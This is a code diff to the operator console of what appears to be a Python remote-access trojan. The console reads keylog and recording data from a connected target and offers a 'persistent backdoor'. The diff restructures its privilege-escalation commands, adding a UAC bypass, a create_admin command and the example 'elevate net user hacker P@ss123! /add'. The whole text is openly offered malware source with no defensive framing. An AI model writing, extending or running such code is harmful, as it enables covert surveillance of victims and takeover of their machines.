@@ -86,17 +86,14 @@ def target_communication():
     print("   stop_video             - Stop video recording")
     print("   list_recordings        - List recorded files")
     print("")
-    print("PRIVILEGE ESCALATION:")
-    print("   check_privs            - Check current privileges")
-    print("   escalate               - Attempt REAL privilege escalation")
-    print("   escalate_force         - Force all escalation methods")
-    print("   elevate <command>      - Execute command with elevated privileges")
-    print("   test_admin             - Test if current user is admin")
-    print("   privesc_report         - Generate privilege report")
-    print("   remote_privesc_test    - Comprehensive remote privilege test")
-    print("")
     print("PERSISTENCE COMMANDS:")
     print("   start_persistence      - Start persistent backdoor (stays running permanently)")
+    print("")
+    print("PRIVILEGE ESCALATION:")
+    print("   check_privs            - Check current privilege level")
+    print("   escalate               - Perform UAC bypass")
+    print("   elevate <command>      - Execute command with admin privileges")
+    print("   create_admin           - Create admin user")
     print("")
     print(f"Connected to target: {ip[0]}:{ip[1]}")
     
@@ -146,38 +143,6 @@ def target_communication():
                 print(f"Keylog Data:\n{'-'*40}")
                 print(result)
                 print("-"*40)
-        elif command in ['check_privs', 'escalate', 'escalate_force', 'test_admin', 'privesc_report', 'remote_privesc_test'] or command.startswith('elevate '):
-            # Handle privilege escalation commands  
-            result = reliable_recv()
-            if command == 'check_privs':
-                print(f"Current Privileges:\n{'-'*50}")
-                print(result)
-                print("-"*50)
-            elif command in ['escalate', 'escalate_force']:
-                print(f"\n{'='*60}")
-                print("PRIVILEGE ESCALATION ATTEMPT")
-                print(f"{'='*60}")
-                print(result)
-                print(f"{'='*60}")
-            elif command == 'test_admin':
-                print(f"Admin Status: {result}")
-            elif command == 'privesc_report':
-                print(f"Privilege Escalation Report:\n{'-'*50}")
-                print(result)
-                print("-"*50)
-            elif command == 'remote_privesc_test':
-                print(f"\n{'='*80}")
-                print("COMPREHENSIVE REMOTE PRIVILEGE ESCALATION TEST")
-                print(f"{'='*80}")
-                print(result)
-                print(f"{'='*80}")
-            elif command.startswith('elevate '):
-                cmd_run = command[8:]  # Extract the command that was elevated
-                print(f"\n{'='*60}")
-                print(f"ELEVATED COMMAND EXECUTION: {cmd_run}")
-                print(f"{'='*60}")
-                print(result)
-                print(f"{'='*60}")
         elif command == 'start_persistence':
             # Handle persistence command
             result = reliable_recv()
@@ -253,19 +218,18 @@ def target_communication():
             result = reliable_recv()
             if command == 'start_persistence':
                 print(f"Persistence: {result}")
-        elif command in ['check_privs', 'escalate', 'privesc_report']:
+        elif command in ['check_privs', 'escalate', 'create_admin']:
             # Handle privilege escalation commands
             result = reliable_recv()
-            if command == 'check_privs':
-                print(f"Privileges: {result}")
-            elif command == 'escalate':
-                print(f"Escalation Result:\n{'-'*40}")
+            print(result)
+        elif command.startswith('elevate '):
+            # Handle elevated command execution
+            if len(command) > 8:
+                result = reliable_recv()
                 print(result)
-                print("-"*40)
-            elif command == 'privesc_report':
-                print(f"Privilege Report:\n{'-'*40}")
-                print(result)
-                print("-"*40)
+            else:
+                print("Usage: elevate <command>")
+                print("Example: elevate net user hacker P@ss123! /add")
 
         else:
             # For other commands, receive and print the result from the target.
